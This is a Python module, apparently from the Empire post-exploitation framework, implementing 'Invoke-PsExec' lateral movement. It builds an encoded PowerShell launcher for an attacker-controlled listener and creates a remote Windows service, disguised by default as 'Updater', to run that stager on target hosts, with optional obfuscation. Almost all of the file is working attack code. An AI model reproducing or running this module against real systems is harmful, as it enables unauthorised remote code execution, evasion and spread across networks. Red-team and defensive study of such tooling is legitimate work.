from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PsExec',

            'Author': ['@harmj0y'],

            'Description': ('Executes a stager on remote hosts using PsExec type functionality.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/rapid7/metasploit-framework/blob/master/tools/psexec.rb'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ComputerName' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   'The name of the service to create.',
                'Required'      :   True,
                'Value'         :   'Updater'
            },
            'Command' : {
                'Description'   :   'Custom command to execute on remote hosts.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ResultFile' : {
                'Description'   :   'Name of the file to write the results to on agent machine.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        computerName = self.options['ComputerName']['Value']
        serviceName = self.options['ServiceName']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        command = self.options['Command']['Value']
        resultFile = self.options['ResultFile']['Value']

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-PsExec.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = ""
        if command != "":
            # executing a custom command on the remote machine
            return ""
            # if 

        else:

            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:

                # generate the PowerShell one-liner with all of the proper options set
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

                if launcher == "":
                    print helpers.color("[!] Error in launcher generation.")
                    return ""
                else:

                    stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
                    scriptEnd += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, stagerCmd)


        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
